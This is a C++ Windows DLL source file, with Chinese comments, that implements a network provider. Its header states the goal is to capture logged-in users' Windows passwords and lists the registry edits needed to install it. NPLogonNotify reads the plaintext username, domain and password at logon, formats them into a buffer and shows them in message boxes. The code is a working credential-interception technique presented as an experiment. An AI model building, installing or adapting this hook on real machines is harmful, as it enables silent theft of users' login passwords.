// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"


/*
获取Windows的登录用户的密码
这是一个项伟大而神奇的操作,始见于《黑客防线》,仔细一看,他是从这个网址精简的.
http://www.codeproject.com/Articles/12146/Login-password-filters-in-WinXP

当然还有别的办法,如分析Winlogon进程和暴力破解,不过这都有局限性,而这个办法是官方公布的通用的办法.
参考信息如下:

NPLogonNotify:
http://msdn.microsoft.com/en-us/library/windows/desktop/aa378804(v=vs.85).aspx
NPGetCaps:
http://msdn.microsoft.com/en-us/library/windows/desktop/aa378794(v=vs.85).aspx
:NPPasswordChangeNotify:
http://msdn.microsoft.com/en-us/library/windows/desktop/aa378806(v=vs.85).aspx

Authentication Registry Keys:
http://msdn.microsoft.com/en-us/library/windows/desktop/aa374737(v=vs.85).aspx

Authentication Return Values:
http://msdn.microsoft.com/en-us/library/windows/desktop/aa374738(v=vs.85).aspx

Installing and Registering a Password Filter DLL:
http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx

Registering to Receive Connection Notifications
http://msdn.microsoft.com/en-us/library/windows/desktop/aa379397(v=vs.85).aspx

主要的设置是操作注册表,不过这可以编程实现:
1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider的order的ProviderOrder后加入一个值,注意逗号.
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider的HwOrder的ProviderOrder后可以不加入.
2.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services下创建刚才键入的值.
3.再在上面(第二步)的路径下创建networkprovider.
4.再在上面(第三步)的路径下创建类型为REG_DWORD的键名Class.
5.再在上面(第三步)的路径下创建类型为REG_MULTI_SZ的键名Name.
6.再在上面(第三步)的路径下创建类型为REG_MULTI_SZ的键名ProviderPath.
7.可以没有:HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa"的Notification Packages后添加一个值.
8.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\Notifyees这个没有实验.

注意:
1.Make sure that you create a 32-bit password filter DLL for 32-bit computers and a 64-bit password filter DLL for 64-bit computers
  不然DLL加载失败.
2.调试方法：内核调试，如COM。本地调试和用户层的网络调试都不行的。
3.最好每次注册之后都重启，而不是注销再登录。主要是下的断点没有断下来。但是可以通过各种途径修改密码等操作。
4.最好不要改DLL的名字，这关系到调试的符号加载问题。
以上每个问题都浪费了我半天的时间。

made by correy
made at 2014.03.06
email:kouleguan at hotmail dot com
homepage:http://correy.webs.com

后来（2014.03.10）发现SDK里面也有这东西，路径在：
Microsoft SDK\Samples\security\NetProviders。
工程的名字叫：LogonNP。
*/


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    //DebugBreak();

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls((HMODULE)hModule);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPGetCaps(DWORD nIndex)
{
    DWORD dwRes;

    switch (nIndex) {
    case WNNC_NET_TYPE:
        dwRes = WNNC_CRED_MANAGER; // credential manager
        break;
    case WNNC_SPEC_VERSION:
        dwRes = WNNC_SPEC_VERSION51;  // We are using version 5.1 of the spec.
        break;
    case WNNC_DRIVER_VERSION:
        dwRes = 1;  // This driver is version 1.
        break;
    case WNNC_START:
        dwRes = 1;  // We are already "started"
        break;
    default:
        dwRes = 0;  // We don't support anything else
        break;
    }

    return dwRes;
}


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPLogonNotify(PLUID lpLogonId, 
                           LPCWSTR lpAuthentInfoType, 
                           LPVOID lpAuthentInfo, 
                           LPCWSTR lpPreviousAuthentInfoType,
                           LPVOID lpPreviousAuthentInfo, 
                           LPWSTR lpStationName, 
                           LPVOID StationHandle, 
                           LPWSTR * lpLogonScript
)
{
    PMSV1_0_INTERACTIVE_LOGON pAuthInfo = (PMSV1_0_INTERACTIVE_LOGON)lpAuthentInfo;

    // If the primary authenticator is not MSV1_0, return success.
    // Why? Because this is the only auth info structure that we understand and we don't want to interact with other types.
    if (lstrcmpiW(L"MSV1_0:Interactive", lpAuthentInfoType)) {
        MessageBoxA(NULL, (char *)pAuthInfo->Password.Buffer, (char *)pAuthInfo->UserName.Buffer, 0);
        SetLastError(NO_ERROR);
        return NO_ERROR;
    }

    // Do something with the authentication information
    if (pAuthInfo->LogonDomainName.Length > 0) {
        if (pAuthInfo->Password.Length > 0) {
            if (pAuthInfo->UserName.Length > 0) {
                CHAR szBuf[1024];
                const char * FormateInfo = "StationName=%lS DomainName = %lS UserName=%lS Password=%lS\r\n";
                wsprintfA(szBuf, 
                          FormateInfo, 
                          lpStationName,
                          pAuthInfo->LogonDomainName.Buffer, 
                          pAuthInfo->UserName.Buffer, 
                          pAuthInfo->Password.Buffer);
                //MessageBox(NULL,szBuf,"Info",0);在登录界面和控制面板里面修改也会走到这里,并且停止在这里,消息框没有弹出.
            } else {
                MessageBoxA(NULL, "No Username", "", 0);
            }
        } else {
            MessageBoxA(NULL, "No Password", "", 0);
        }
    } else {
        MessageBoxA(NULL, "No domain Name", "", 0);
    }

    // Let's utilize the logon script capability to display our logon information       
    *lpLogonScript = (LPWSTR)LocalAlloc(LPTR, 1024);// The Caller MUST free this memory

    return NO_ERROR;
}


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPPasswordChangeNotify(LPCWSTR lpAuthentInfoType, 
                                    LPVOID lpAuthentInfo, 
                                    LPCWSTR lpPreviousAuthentInfoType,
                                    LPVOID lpPreviousAuthentInfo,
                                    LPWSTR lpStationName, 
                                    LPVOID StationHandle, 
                                    DWORD dwChangeInfo
)
/*
在登录界面的修改密码会走到这里.
控制面板的修改密码发现没有走到这里.
命令行的修改密码没有测试.
*/
{
    PMSV1_0_INTERACTIVE_LOGON pAuthInfo = (PMSV1_0_INTERACTIVE_LOGON)lpAuthentInfo;//这里有修改后的密码.

    return NO_ERROR;
}
